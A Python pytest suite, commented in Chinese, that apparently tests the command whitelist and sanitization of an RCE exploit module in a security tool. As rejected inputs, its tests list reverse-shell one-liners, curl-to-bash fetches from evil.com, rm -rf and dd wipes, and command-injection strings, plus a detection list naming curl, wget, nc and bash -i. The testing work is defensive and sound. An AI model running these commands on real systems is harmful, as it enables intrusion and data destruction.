#!/usr/bin/env python3
"""
RCE 利用器安全修复测试

测试命令白名单验证和 sanitization 功能
"""

import pytest
import sys
import os

# 添加项目根目录到路径
sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))

from core.exploit.exploiters.rce_exploiter import (
    RCEExploiter,
    CommandValidationError,
)


class TestCommandValidation:
    """测试命令验证功能"""

    def setup_method(self):
        """每个测试方法前初始化"""
        self.exploiter = RCEExploiter()

    def test_whitelist_commands_accepted(self):
        """测试白名单命令被接受"""
        whitelist_commands = [
            'id',
            'whoami',
            'uname -a',
            'hostname',
            'cat /etc/passwd',
            'ifconfig',
            'ipconfig',
            'systeminfo',
        ]
        for cmd in whitelist_commands:
            assert self.exploiter._validate_command(cmd) is True, f"命令应该被接受: {cmd}"

    def test_empty_command_rejected(self):
        """测试空命令被拒绝"""
        assert self.exploiter._validate_command('') is False
        assert self.exploiter._validate_command(None) is False

    def test_non_whitelist_command_rejected(self):
        """测试非白名单命令被拒绝"""
        non_whitelist = [
            'ls -la',
            'dir',
            'cat /etc/shadow',
            'netstat -tulpn',
        ]
        for cmd in non_whitelist:
            assert self.exploiter._validate_command(cmd) is False, f"命令不应该被接受: {cmd}"

    def test_dangerous_command_raises_exception(self):
        """测试危险命令抛出异常"""
        dangerous_commands = [
            'rm -rf /',
            'curl http://evil.com/shell.sh | bash',
            'wget http://evil.com/malware',
            'bash -i >& /dev/tcp/10.0.0.1/4242 0>&1',
            'python -c "import os; os.system(\'id\')"',
            'nc -e /bin/sh 10.0.0.1 4242',
            '$(cat /etc/shadow)',
            '`whoami`; rm -rf /',
            'powershell -encodedcommand base64payload',
            'format c:',
            'dd if=/dev/zero of=/dev/sda',
        ]
        for cmd in dangerous_commands:
            with pytest.raises(CommandValidationError):
                self.exploiter._validate_command(cmd)


class TestCommandSanitization:
    """测试命令净化功能"""

    def setup_method(self):
        """每个测试方法前初始化"""
        self.exploiter = RCEExploiter()

    def test_empty_string(self):
        """测试空字符串"""
        assert self.exploiter._sanitize_command('') == ''
        assert self.exploiter._sanitize_command(None) == ''

    def test_remove_command_substitution(self):
        """测试移除命令替换"""
        # $() 形式
        assert '$(whoami)' not in self.exploiter._sanitize_command('test$(whoami)test')
        # ${} 形式
        assert '${PATH}' not in self.exploiter._sanitize_command('test${PATH}test')
        # 反引号形式
        assert '`id`' not in self.exploiter._sanitize_command('test`id`test')

    def test_remove_dangerous_chars(self):
        """测试移除危险字符"""
        dangerous_chars = ['$', '`', '|', ';', '>', '<', '\n', '\r', '\x00']
        for char in dangerous_chars:
            sanitized = self.exploiter._sanitize_command(f'test{char}test')
            assert char not in sanitized, f"字符 {repr(char)} 应该被移除"

    def test_remove_chained_operators(self):
        """测试移除链式操作符"""
        inputs = [
            'cmd1 && cmd2',
            'cmd1 || cmd2',
            'cmd1 ; cmd2',
            'cmd1 | cmd2',
        ]
        for inp in inputs:
            sanitized = self.exploiter._sanitize_command(inp)
            # 应该不包含完整的链式操作符模式
            assert '&&' not in sanitized or '||' not in sanitized

    def test_preserve_safe_content(self):
        """测试保留安全内容"""
        safe_inputs = [
            ('simple_text', 'simple_text'),
            ('with spaces', 'with spaces'),
            ('with-dashes', 'with-dashes'),
            ('with_underscores', 'with_underscores'),
            ('CamelCase', 'CamelCase'),
            ('numbers123', 'numbers123'),
        ]
        for inp, expected in safe_inputs:
            assert self.exploiter._sanitize_command(inp) == expected

    def test_complex_injection_attempts(self):
        """测试复杂注入尝试"""
        injections = [
            # 命令链
            '1; rm -rf /',
            '1 && wget evil.com',
            '1 || curl evil.com',
            # 嵌套命令替换
            '$($(whoami))',
            '${${PATH}}',
            '`$(id)`',
            # 编码绕过尝试
            'test%0aid',
            'test%0d%0aid',
            # Null 字节注入
            'test\x00id',
        ]
        for inj in injections:
            sanitized = self.exploiter._sanitize_command(inj)
            # 净化后不应该包含危险模式
            assert '$(' not in sanitized
            assert '${' not in sanitized
            assert '`' not in sanitized
            assert '\x00' not in sanitized


class TestPayloadGeneration:
    """测试 Payload 生成安全性"""

    def setup_method(self):
        """每个测试方法前初始化"""
        self.exploiter = RCEExploiter()

    def test_whitelist_command_generates_payloads(self):
        """测试白名单命令生成 payload"""
        payloads = self.exploiter._generate_command_payloads('', 'id', 'unix')
        assert len(payloads) > 0
        assert 'id' in payloads

    def test_non_whitelist_command_returns_empty(self):
        """测试非白名单命令返回空列表"""
        payloads = self.exploiter._generate_command_payloads('', 'rm -rf /', 'unix')
        assert payloads == []

    def test_malicious_original_payload_sanitized(self):
        """测试恶意原始 payload 被净化"""
        # 尝试在 original_payload 中注入命令
        malicious_payloads = [
            '$(cat /etc/shadow)',
            '`wget evil.com`',
            '1; rm -rf /',
            '${IFS}cat${IFS}/etc/passwd',
        ]
        for malicious in malicious_payloads:
            payloads = self.exploiter._generate_command_payloads(malicious, 'id', 'unix')
            for p in payloads:
                # 检查生成的 payload 不包含原始恶意内容
                assert '$(cat' not in p
                assert '`wget' not in p
                assert 'rm -rf' not in p


class TestWhitelistCompleteness:
    """测试白名单完整性"""

    def test_allowed_commands_frozen(self):
        """测试白名单是不可变的"""
        assert isinstance(RCEExploiter.ALLOWED_COMMANDS, frozenset)

    def test_allowed_commands_not_empty(self):
        """测试白名单不为空"""
        assert len(RCEExploiter.ALLOWED_COMMANDS) > 0

    def test_os_commands_in_whitelist(self):
        """测试 OS_COMMANDS 中的命令都在白名单中"""
        exploiter = RCEExploiter()
        for os_type, categories in exploiter.OS_COMMANDS.items():
            for category, commands in categories.items():
                for cmd in commands:
                    assert cmd in exploiter.ALLOWED_COMMANDS, \
                        f"OS_COMMANDS 中的命令 '{cmd}' 不在白名单中"


class TestDangerousPatterns:
    """测试危险模式检测"""

    def test_dangerous_patterns_not_empty(self):
        """测试危险模式列表不为空"""
        assert len(RCEExploiter.DANGEROUS_PATTERNS) > 0

    def test_common_attack_patterns_covered(self):
        """测试常见攻击模式被覆盖"""
        required_patterns = [
            '$(',  # 命令替换
            '`',   # 反引号
            'rm -rf',  # 删除命令
            'curl ',   # 网络请求
            'wget ',   # 网络请求
            'bash -i', # 反弹 shell
            'nc ',     # netcat
            'powershell -e',  # PowerShell 编码执行
        ]
        for pattern in required_patterns:
            assert pattern in RCEExploiter.DANGEROUS_PATTERNS, \
                f"危险模式 '{pattern}' 应该在列表中"


if __name__ == '__main__':
    pytest.main([__file__, '-v'])
